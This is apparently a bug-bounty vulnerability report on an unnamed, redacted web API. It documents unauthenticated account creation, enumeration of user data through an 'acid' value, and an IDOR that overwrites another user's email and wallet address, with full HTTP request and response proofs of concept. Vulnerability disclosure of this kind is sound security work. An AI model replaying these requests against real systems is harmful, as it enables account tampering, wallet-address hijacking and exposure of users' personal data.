Insecure Account Creation and IDOR via acid parameter

BOUNTY-DEX Vulnerability Report

Type: Unauthenticated account creation / IDOR / Sensitive enumeration

Status: FOUND

HIGH

Summary

The application exposes an unauthenticated endpoint that allows creating new user accounts without any authentication or rate-limiting. The same API accepts an acid value which can be used to retrieve or update other users' profiles, leading to Insecure Direct Object Reference (IDOR).

Endpoints & Parameters

The following endpoints were tested (found inside JS files):

  • POST /api/user/create — create a user (unauthenticated)
  • POST /api/user/update/{id} — update a user by id (requires cookie acid to match target account)

Proof of Concept

1) Unauthenticated account creation

Creating an account via the public endpoint returns success and the created resource.

Request:

POST /api/user/create HTTP/1.1
Host: [REDACTED]
Content-Type: application/json;charset=UTF-8

{
"acid":"aaaaa"
}

Response:

HTTP/1.1 200 OK
{
"data":{
"id":2322,
"attributes":{
"username":null,
"email":null,
"walletAddress":null,
"country":null,
"acid":"aaaaa"
}
}
}

2) Create with profile fields

It's possible to supply additional fields (email, username, walletAddress) during creation and receive them back in the response.

POST /api/user/create HTTP/1.1
Host: [REDACTED]
Content-Type: application/json;charset=UTF-8

{
"acid":"hacked",
"email":"hacked@redacted.com",
"username":"hacked",
"walletAddress":"hacked"
}

3) Enumeration by acid

By knowing an acid value (it is stored in a cookie in the application), an attacker can send a request with that acid to the create endpoint or to a retrieval endpoint and see data associated with that acid.

Request with known acid:

POST /api/user/create HTTP/1.1
Host: [REDACTED]
Content-Type: application/json;charset=UTF-8

{
"acid":"account1"
}

Response shows data associated with acid "account1":

HTTP/1.1 200 OK
{
"data":{
"id":2323,
"attributes":{
"username":"account1",
"email":"account1@redacted.com",
"walletAddress":"account1",
"country":null,
"acid":"account1"
}
}
}

4) IDOR — update another user's profile using acid

After creating or enumerating a target's acid value and obtaining the target user's numeric id from a response, an attacker can update that user's profile by calling the update endpoint and sending the target's acid value in the Cookie header and the user id in the path.

Request:

POST /api/user/update/2370 HTTP/1.1
Host: [REDACTED]
Cookie: acid=1234
Content-Type: application/json;charset=UTF-8

{
"walletAddress":"0x1234567282",
"email":"attacker@redacted.com",
"username":"hacked by researcher"
}

Response indicates the user record was modified:

HTTP/1.1 200 OK
{
"data":{
"id":2370,
"attributes":{
"username":"hacked by researcher",
"email":"attacker@redacted.com",
"walletAddress":"0x1234567282",
"acid":"1234"
}
}
}

Impact

  • Unlimited account creation: resource exhaustion, database pollution or spam accounts.
  • IDOR via acid: allows unauthorized modification of other users' profiles when attacker supplies the target acid and id.
  • Sensitive fields enumeration: attackers can enumerate emails, usernames, and other attributes.
